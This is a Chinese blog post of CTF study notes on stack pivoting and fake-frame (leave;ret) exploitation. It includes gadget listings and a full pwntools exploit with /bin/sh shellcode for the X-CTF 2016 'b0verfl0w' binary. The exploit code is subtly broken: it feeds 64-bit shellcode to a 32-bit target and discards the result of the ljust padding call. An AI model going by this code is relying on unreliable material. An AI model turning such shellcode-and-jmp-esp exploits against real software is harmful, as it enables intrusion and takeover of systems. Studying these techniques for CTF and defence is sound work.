---
title: 花式栈溢出
date: 2023-04-24 20:37:48
tags:
---
本文是本人跟着ctf-wiki上学之后做的笔记，自认为写得比较详细

## 栈转移

栈转移是指劫持`SP`指针到我们能控制的位置，以便实现一些之前不方便的操作

一般来说需要使用该技巧的情况有：

- 可控的栈溢出字节数较少，难以构造长 payload 进行 rop
- 有PIE地址随机化，栈地址未知。可以通过劫持转移栈到已知地址
- 其他漏洞难利用，转换后更方便，比如把栈转移到堆空间后写rop

要求有：

- 可控程序执行流
- 可控`SP`指针

一般来说控制`SP`指针用`pop rsp/esp`

`__libc_csu_init`中就有这种gadgets，但要使用偏移

```python
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:  pop    rbx
0x40061b <__libc_csu_init+91>:  pop    rbp
0x40061c <__libc_csu_init+92>:  pop    r12
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:  pop    rsp  # 原本pop r12
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret
```

此外，还有更加高级的 fake frame，要求有一段可以控制内容的内存，一般是如下：

- bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。然而一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。
- heap。但是这个需要我们能够泄露堆地址。

### X-CTF Quals 2016 - b0verfl0w

```
checksec: 什么都没开
Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

IDA反编译：

```c
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin); # 读50个字符，不好构造长payload
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

这题的思路是在栈上填入短`shellcode`，然后想办法`jmp esp`，`EIP`就会跳到栈上。我们提前在栈上填入机器码处理`esp`，使`esp`指向`shellcode`后再次`jmp esp`

构造的payload结构如下：

`shellcode|padding|ebp|jmp_esp_addr|asm("sub esp, 0x?;jmp esp")`

```bash
# 查找 jmp esp
$ ROPgadget --binary b0verfl0w --only "jmp"|grep esp
0x08048504 : jmp esp
```

执行`sub esp`时`ESP`到shellcode的距离可以通过看payload长度计算出来

首先`shellcode+padding`是0x20

`ebp`0x4

`jmp_esp_addr` 0x4

我们需要设置`esp`到`shellcode`，而此时`esp`在`jmp_esp_addr`的后面指向asm，所以需要对`esp` - 0x28

exp：

```python
from pwn import *
sh = process("./b0verfl0w")

shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73"
shellcode += b"\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
shellcode.ljust(0x20, b'a') # 填充shellcode长度
sub_esp_jmp_esp = asm("sub esp, 0x28;jmp esp") #生成机器码
jmp_esp_addr = 0x08048504
payload = flat([shellcode, "bbbb", jmp_esp_addr, sub_esp_jmp_esp])
sh.sendline(payload)
sh.interactive()
```

## frame faking(栈伪造)

构建一个虚假的栈帧来控制程序的执行流。我们需要同时控制`IP`和`BP`寄存器，这样我们就能在控制程序执行流的同时也改变栈帧的位置

以下内容基于x86架构

这种攻击方式payload的格式一般如下：`buffer padding|fake ebp|leave_ret_addr|`其中`fake ebp`为我们构造的假栈帧的基址。注意这里多了`leave`指令

回顾`leave`指令的等效用法：`mov esp, ebp; pop ebp` 在执行此命令之前，`EBP`指向栈中saved ebp

执行后，`EBP`回到主调函数位置，`ESP`指向retaddr

而`ret`指令实际上等效于`pop eip`，执行后`ESP`完全回到主调函数的原位置

上面提到的payload中，`retaddr`被覆盖为`leave_ret_addr`，这导致程序ret后会再次执行`leave` `ret`

接下来的描述有点绕，在这里先明确一些代号：

- `ebp2`是一个值，这个值是一个内存地址，是我们最终想赋给寄存器`EBP`的值(使`EBP`指向这个地址)
- `ebp2_addr`是一个值，这个值是一个内存地址，该处内存保存着`ebp2`的值

假栈帧大致格式：

```

+---------------------+
| arg2 of function    | 高地址
+---------------------+
| arg1 of function    |
+---------------------+
| leave_ret_addr      |
+---------------------+
| target function addr|
+---------------------+
| ebp2                |
+---------------------+ <- ebp2_addr
```

payload的`fake ebp` 就是 `ebp2_addr`:

```
buffer padding|fake ebp|leave_ret_addr|
buffer padding|ebp2_addr|leave_ret_addr|
```

利用此payload，我们可以依次做以下事情：

```nasm
leave:
	mov esp, ebp
	pop ebp # 使ebp变为ebp2_addr

ret # run leave ret again

leave:
	mov esp, ebp # 使esp也变为ebp2_addr，这让esp指向了ebp2_addr
	pop ebp # 此时esp指向ebp2_addr，此操作会将该处内存的ebp2值赋给ebp

ret # return to target function 需要提前在ebp2_addr+4处写入target function addr

# after target function, return to leave_ret_addr
# 然后程序又会执行类似的操作。如果我们在ebp2指向的地址处也设置好了相应内容，就能继续劫持ebp+eip
# 当然，如果假栈帧能控制的大小足够长，我们也可以直接像以前一样构造纯粹的rop，不再借助leave ret
# 即假栈帧的结构为:

+---------------------+
| ...                 | 高地址
+---------------------+
| next_retaddr        |
+---------------------+
| arg2                |
+---------------------+
| arg1                |
+---------------------+
| pop_xxx_pop_xxx_ret |
+---------------------+
| target function addr|
+---------------------+
| ebp2                | 
+---------------------+ <- ebp2_addr
```

### 待添加